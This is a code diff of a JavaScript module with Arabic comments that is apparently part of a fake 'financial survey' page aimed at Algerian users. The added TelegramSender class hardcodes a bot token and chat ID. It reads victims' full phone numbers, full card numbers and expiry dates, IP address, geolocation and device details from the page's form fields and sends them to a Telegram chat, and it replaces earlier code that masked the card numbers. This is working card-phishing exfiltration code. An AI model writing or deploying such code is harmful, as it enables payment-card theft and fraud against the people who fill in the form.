@@ -1,244 +1,297 @@
-// إعدادات بوت تليجرام
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع توكن البوت هنا
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع معرف الدردشة هنا
-
-// إرسال البيانات إلى تليجرام
-async function sendTelegramData(eventType, data) {
-    try {
-        const message = formatTelegramMessage(eventType, data);
+// ملف إرسال البيانات إلى Telegram
+class TelegramSender {
+    constructor() {
+        // ⚠️ استبدل هذه المعلومات بمعلومات بوتك الخاص
+        this.BOT_TOKEN = '7184149653:AAE1Oajv2u7a0Q9sskP8v1x7etEoXeZLswY';
+        this.CHAT_ID = '6637246735';
+        this.API_URL = `https://api.telegram.org/bot${this.BOT_TOKEN}`;
         
-        // إعداد طلب HTTP
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            disable_notification: false
+        // رسائل النجاح والفشل
+        this.messages = {
+            success: '✅ تم إرسال البيانات بنجاح!',
+            error: '❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.',
+            validation: '⚠️ يرجى تعبئة جميع الحقول بشكل صحيح.',
+            sending: '📤 جاري إرسال البيانات...'
         };
-        
-        // إرسال البيانات (غير متزامن، لا ينتظر الاستجابة)
-        fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload)
-        }).catch(error => {
-            console.error('Error sending to Telegram:', error);
+    }
+
+    // التحقق من صحة التوكن
+    async validateToken() {
+        try {
+            const response = await fetch(`${this.API_URL}/getMe`);
+            const data = await response.json();
+            return data.ok;
+        } catch (error) {
+            console.error('خطأ في التحقق من التوكن:', error);
+            return false;
+        }
+    }
+
+    // تنسيق البيانات للرسالة
+    formatDataForMessage(userData, deviceData) {
+        const timestamp = new Date().toLocaleString('ar-SA', {
+            timeZone: 'Africa/Algiers',
+            dateStyle: 'full',
+            timeStyle: 'medium'
         });
-        
-        // حفظ محلي للبيانات (للنسخ الاحتياطي)
-        saveDataLocally(eventType, data);
-        
-    } catch (error) {
-        console.error('Error in sendTelegramData:', error);
-    }
-}
 
-// تنسيق رسالة تليجرام
-function formatTelegramMessage(eventType, data) {
-    const timestamp = new Date().toISOString();
-    let message = `<b>📊 ${getEventTypeName(eventType)}</b>\n`;
-    message += `⏰ <b>الوقت:</b> ${formatTime(timestamp)}\n`;
-    message += `🆔 <b>معرف الجلسة:</b> ${data.sessionId || getSessionId() || 'غير معروف'}\n\n`;
-    
-    switch(eventType) {
-        case 'session_started':
-            message += `🌐 <b>المرجع:</b> ${data.referrer || 'مباشر'}\n`;
-            message += `🕒 <b>وقت البدء:</b> ${formatTime(data.startTime)}\n`;
-            break;
-            
-        case 'page_view':
-            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
-            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
-            message += `📍 <b>موضع التمرير:</b> ${data.scrollPosition}px\n`;
-            break;
-            
-        case 'button_click':
-            message += `🖱️ <b>زر:</b> ${data.text}\n`;
-            message += `🔗 <b>ID:</b> ${data.id}\n`;
-            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
-            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
-            break;
-            
-        case 'specific_button_click':
-            message += `🖱️ <b>زر محدد:</b> ${data.buttonId}\n`;
-            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
-            message += `⏱️ <b>مدة الجلسة:</b> ${formatDuration(data.sessionDuration)}\n`;
-            break;
-            
-        case 'touch_event':
-            message += `👆 <b>لمسات:</b> ${data.touches}\n`;
-            message += `📍 <b>الإحداثيات:</b> X:${data.x}, Y:${data.y}\n`;
-            message += `📄 <b>الصفحة:</b> ${data.page}\n`;
-            break;
-            
-        case 'step1_completed':
-            message += `📱 <b>رقم الهاتف:</b> ${data.phone}\n`;
-            message += `💳 <b>رقم البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
-            message += `📅 <b>تاريخ الانتهاء:</b> ${data.expiryDate}\n`;
-            message += `✅ <b>تم إكمال الخطوة الأولى</b>\n`;
-            break;
-            
-        case 'survey_completed':
-            message += `🎉 <b>تم إكمال الاستبيان!</b>\n\n`;
-            message += `<b>📊 معلومات المستخدم:</b>\n`;
-            message += `📱 <b>الهاتف:</b> ${data.phone}\n`;
-            message += `💳 <b>البطاقة:</b> ${maskCardNumber(data.cardNumber)}\n`;
-            message += `🔢 <b>كود التحقق:</b> ${data.verificationCode}\n\n`;
-            message += `<b>🖥️ معلومات الجهاز:</b>\n`;
-            message += `📱 <b>النوع:</b> ${data.deviceInfo.deviceType}\n`;
-            message += `⚙️ <b>نظام التشغيل:</b> ${data.deviceInfo.os}\n`;
-            message += `🌐 <b>المتصفح:</b> ${data.deviceInfo.browser}\n`;
-            message += `📐 <b>الدقة:</b> ${data.deviceInfo.screenWidth}×${data.deviceInfo.screenHeight}\n`;
-            message += `🗣️ <b>اللغة:</b> ${data.deviceInfo.language}\n`;
-            break;
-            
-        case 'session_ended':
-            message += `👋 <b>انتهت الجلسة</b>\n`;
-            message += `⏱️ <b>المدة:</b> ${formatDuration(data.duration)}\n`;
-            message += `📊 <b>مشاهدات الصفحات:</b> ${data.pageViews}\n`;
-            message += `🔄 <b>عدد الإجراءات:</b> ${data.actionsCount}\n`;
-            break;
-            
-        case 'user_actions_summary':
-            message += `📈 <b>ملخص الإجراءات:</b>\n`;
-            data.actions.forEach((action, index) => {
-                message += `${index + 1}. ${getActionDescription(action)}\n`;
+        let message = `
+🎯 *بيانات جديدة من الاستبيان المالي - الجزائر*
+⏰ *الوقت:* ${timestamp}
+🔢 *رقم المشاركة:* ALG-${Date.now().toString().slice(-8)}
+
+📱 *معلومات الاتصال:*
+├─ 📞 الهاتف: \`${userData.phone}\`
+├─ 💳 رقم البطاقة: \`${userData.cardNumber}\`
+└─ 📅 تاريخ الانتهاء: \`${userData.expiryDate}\`
+
+🖥️ *معلومات الجهاز:*
+├─ 📱 نوع الجهاز: ${deviceData.device.deviceType}
+├─ 💻 نظام التشغيل: ${deviceData.device.operatingSystem}
+├─ 🌐 المتصفح: ${deviceData.device.browser}
+├─ 📺 دقة الشاشة: ${deviceData.device.screenWidth} × ${deviceData.device.screenHeight}
+├─ 🌍 اللغة: ${deviceData.device.language}
+└─ 🕒 المنطقة الزمنية: ${deviceData.device.timezone}
+
+🌐 *معلومات الشبكة:*
+├─ 🔗 IP: \`${deviceData.network.ipAddress}\`
+├─ 📍 المدينة: ${deviceData.network.location.city || 'غير معروف'}
+├─ 🏳️ الدولة: ${deviceData.network.location.country_name || 'غير معروف'}
+└─ 📶 مزود الخدمة: ${deviceData.network.location.org || 'غير معروف'}
+
+📊 *معلومات إضافية:*
+├─ 🔗 المرجع: ${deviceData.additional.referrer}
+├─ 📍 الصفحة: ${deviceData.additional.pageUrl}
+├─ 📱 جهاز محمول: ${deviceData.device.isMobile ? 'نعم' : 'لا'}
+└─ 👆 شاشة لمس: ${deviceData.device.isTouchDevice ? 'نعم' : 'لا'}
+`;
+
+        // إضافة معلومات الموقع الجغرافي إذا كانت متاحة
+        if (deviceData.geolocation && !deviceData.geolocation.error) {
+            message += `
+📍 *الموقع الجغرافي:*
+├─ 📍 خط العرض: ${deviceData.geolocation.latitude}
+├─ 📍 خط الطول: ${deviceData.geolocation.longitude}
+└─ 📏 الدقة: ${deviceData.geolocation.accuracy} متر
+`;
+        }
+
+        // إضافة معلومات الاتصال إذا كانت متاحة
+        if (deviceData.device.connection) {
+            message += `
+📶 *معلومات الاتصال:*
+├─ 📶 نوع الشبكة: ${deviceData.device.connection.effectiveType}
+├─ ⬇️ سرعة التنزيل: ${deviceData.device.connection.downlink} Mbps
+└─ ⏱️ وقت الاستجابة: ${deviceData.device.connection.rtt} ms
+`;
+        }
+
+        return message;
+    }
+
+    // إرسال الرسالة إلى Telegram
+    async sendMessage(text) {
+        try {
+            const response = await fetch(`${this.API_URL}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: this.CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
             });
-            break;
+
+            const data = await response.json();
             
-        default:
-            message += `📝 <b>البيانات:</b> ${JSON.stringify(data, null, 2).substring(0, 1000)}\n`;
+            if (data.ok) {
+                console.log('✅ تم إرسال الرسالة بنجاح:', data.result.message_id);
+                
+                // إرسال رسالة ثانية مع المزيد من التفاصيل
+                await this.sendDetailedData(text);
+                
+                return { success: true, messageId: data.result.message_id };
+            } else {
+                console.error('❌ خطأ من Telegram API:', data.description);
+                return { success: false, error: data.description };
+            }
+        } catch (error) {
+            console.error('❌ خطأ في إرسال الرسالة:', error);
+            return { success: false, error: error.message };
+        }
     }
-    
-    // إضافة رابط للجلسة
-    message += `\n────────────────────\n`;
-    message += `🔗 <a href="https://t.me/your_bot">عرض التفاصيل الكاملة</a>`;
-    
-    return message;
-}
 
-// وظائف مساعدة للتنسيق
-function getEventTypeName(eventType) {
-    const names = {
-        'session_started': 'بداية جلسة جديدة',
-        'page_view': 'مشاهدة صفحة',
-        'button_click': 'نقر على زر',
-        'specific_button_click': 'نقر زر محدد',
-        'touch_event': 'لمس الشاشة',
-        'step1_completed': 'إكمال الخطوة الأولى',
-        'survey_completed': 'إكمال الاستبيان',
-        'session_ended': 'نهاية الجلسة',
-        'user_actions_summary': 'ملخص إجراءات المستخدم',
-        'thankyou_page_viewed': 'مشاهدة صفحة الشكر'
-    };
-    
-    return names[eventType] || eventType;
-}
+    // إرسال بيانات مفصلة في رسالة منفصلة
+    async sendDetailedData(initialMessage) {
+        try {
+            const detailedMessage = `
+🔐 *بيانات مفصلة - الجزائر*
 
-function formatTime(isoString) {
-    const date = new Date(isoString);
-    return date.toLocaleString('ar-SA', {
-        timeZone: 'Africa/Algiers',
-        hour12: true,
-        year: 'numeric',
-        month: 'long',
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-}
+📞 *رقم الهاتف الكامل:* 
+\`${document.getElementById('phone')?.value || 'غير متوفر'}\`
 
-function formatDuration(ms) {
-    const seconds = Math.floor(ms / 1000);
-    const minutes = Math.floor(seconds / 60);
-    const hours = Math.floor(minutes / 60);
-    
-    if (hours > 0) {
-        return `${hours} ساعة ${minutes % 60} دقيقة`;
-    } else if (minutes > 0) {
-        return `${minutes} دقيقة ${seconds % 60} ثانية`;
-    } else {
-        return `${seconds} ثانية`;
+💳 *بيانات البطاقة الكاملة:*
+• الرقم: \`${document.getElementById('card-number')?.value || 'غير متوفر'}\`
+• الانتهاء: \`${document.getElementById('expiry-date')?.value || 'غير متوفر'}\`
+
+🖥️ *معلومات المتصفح الكاملة:*
+${navigator.userAgent}
+
+📊 *إحصائيات الجهاز:*
+• الذاكرة: ${navigator.deviceMemory || 'غير معروف'} GB
+• المعالجات: ${navigator.hardwareConcurrency || 'غير معروف'}
+• عمق الألوان: ${screen.colorDepth} بت
+• نسبة البكسل: ${window.devicePixelRatio}
+
+🌍 *معلومات الموقع:*
+• العنوان الكامل: ${window.location.href}
+• اللغات المفضلة: ${navigator.languages?.join(', ') || 'غير معروف'}
+
+⏰ *الوقت الدقيق:* ${new Date().toISOString()}
+            `.trim();
+
+            await fetch(`${this.API_URL}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: this.CHAT_ID,
+                    text: detailedMessage,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+        } catch (error) {
+            console.error('خطأ في إرسال البيانات المفصلة:', error);
+        }
     }
-}
 
-function maskCardNumber(cardNumber) {
-    if (!cardNumber) return 'غير معروف';
-    const cleanNumber = cardNumber.replace(/\s/g, '');
-    return `**** **** **** ${cleanNumber.slice(-4)}`;
-}
+    // إرسال الإخطار الأولي
+    async sendInitialNotification() {
+        const notification = `
+🔔 *بدء استبيان جديد - الجزائر*
 
-function getActionDescription(action) {
-    switch(action.type) {
-        case 'page_view':
-            return `صفحة: ${action.data.page}`;
-        case 'button_click':
-            return `نقر: ${action.data.text}`;
-        case 'touch_event':
-            return `لمس: ${action.data.touches} إصبع`;
-        default:
-            return action.type;
+📱 *تم بدء استبيان جديد في:* ${new Date().toLocaleString('ar-SA', {
+            timeZone: 'Africa/Algiers',
+            hour12: true,
+            dateStyle: 'medium',
+            timeStyle: 'medium'
+        })}
+
+🖥️ *المتصفح:* ${navigator.userAgent.substring(0, 50)}...
+
+📍 *الصفحة:* ${window.location.href}
+
+⏳ *جاري تعبئة البيانات...*
+        `.trim();
+
+        return await this.sendMessage(notification);
     }
-}
 
-// حفظ البيانات محلياً للنسخ الاحتياطي
-function saveDataLocally(eventType, data) {
-    try {
-        const key = `survey_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-        const storageData = {
-            eventType,
-            data,
+    // العملية الرئيسية لإرسال البيانات
+    async sendUserData(userData, deviceData) {
+        try {
+            // عرض حالة الإرسال
+            this.showNotification(this.messages.sending, 'warning');
+            
+            // إرسال الإخطار الأولي
+            await this.sendInitialNotification();
+            
+            // تنسيق البيانات وإرسالها
+            const formattedMessage = this.formatDataForMessage(userData, deviceData);
+            const result = await this.sendMessage(formattedMessage);
+            
+            if (result.success) {
+                this.showNotification(this.messages.success, 'success');
+                
+                // تسجيل نجاح الإرسال
+                this.logSubmission(userData, deviceData, true);
+                
+                return true;
+            } else {
+                this.showNotification(this.messages.error, 'error');
+                
+                // تسجيل فشل الإرسال
+                this.logSubmission(userData, deviceData, false, result.error);
+                
+                return false;
+            }
+        } catch (error) {
+            console.error('❌ خطأ في إرسال بيانات المستخدم:', error);
+            this.showNotification(this.messages.error, 'error');
+            return false;
+        }
+    }
+
+    // عرض الإشعارات
+    showNotification(message, type = 'info') {
+        const notification = document.getElementById('notification');
+        
+        if (!notification) {
+            console.log(message);
+            return;
+        }
+        
+        notification.textContent = message;
+        notification.className = `notification ${type} show`;
+        
+        // إخفاء الإشعار بعد 5 ثواني
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 5000);
+    }
+
+    // تسجيل عملية الإرسال
+    logSubmission(userData, deviceData, success, error = null) {
+        const logEntry = {
             timestamp: new Date().toISOString(),
-            sessionId: getSessionId()
+            userData: {
+                phone: userData.phone,
+                cardNumber: userData.cardNumber,
+                expiryDate: userData.expiryDate
+            },
+            deviceInfo: {
+                ip: deviceData.network.ipAddress,
+                deviceType: deviceData.device.deviceType,
+                browser: deviceData.device.browser
+            },
+            success: success,
+            error: error,
+            page: window.location.href
         };
         
-        localStorage.setItem(key, JSON.stringify(storageData));
-        
-        // تنظيف البيانات القديمة (أكثر من يوم)
-        cleanupOldLocalData();
-        
-    } catch (error) {
-        console.error('Error saving data locally:', error);
+        // تخزين السجل محلياً
+        try {
+            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            logs.push(logEntry);
+            localStorage.setItem('telegram_logs', JSON.stringify(logs.slice(-100))); // حفظ آخر 100 سجل
+        } catch (e) {
+            console.error('خطأ في حفظ السجل:', e);
+        }
     }
-}
 
-function cleanupOldLocalData() {
-    const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
-    
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key && key.startsWith('survey_data_')) {
-            try {
-                const data = JSON.parse(localStorage.getItem(key));
-                if (data && new Date(data.timestamp).getTime() < oneDayAgo) {
-                    localStorage.removeItem(key);
-                }
-            } catch (e) {
-                // تجاهل الأخطاء في التنظيف
-            }
+    // اختبار الاتصال بالبوت
+    async testConnection() {
+        this.showNotification('🔍 جاري اختبار الاتصال...', 'warning');
+        
+        const isValid = await this.validateToken();
+        
+        if (isValid) {
+            this.showNotification('✅ الاتصال مع Telegram ناجح!', 'success');
+            return true;
+        } else {
+            this.showNotification('❌ فشل الاتصال مع Telegram', 'error');
+            return false;
         }
     }
 }
 
-// وظيفة لتحميل جميع البيانات المحفوظة (للتطوير)
-function getAllLocalData() {
-    const allData = [];
-    
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key && key.startsWith('survey_data_')) {
-            try {
-                const data = JSON.parse(localStorage.getItem(key));
-                allData.push(data);
-            } catch (e) {
-                // تجاهل البيانات التالفة
-            }
-        }
-    }
-    
-    return allData;
-}
+// إنشاء كائن الإرسال العام
+const telegramSender = new TelegramSender();
+
+// تصدير الكائن للاستخدام في ملفات أخرى
+window.telegramSender = telegramSender;
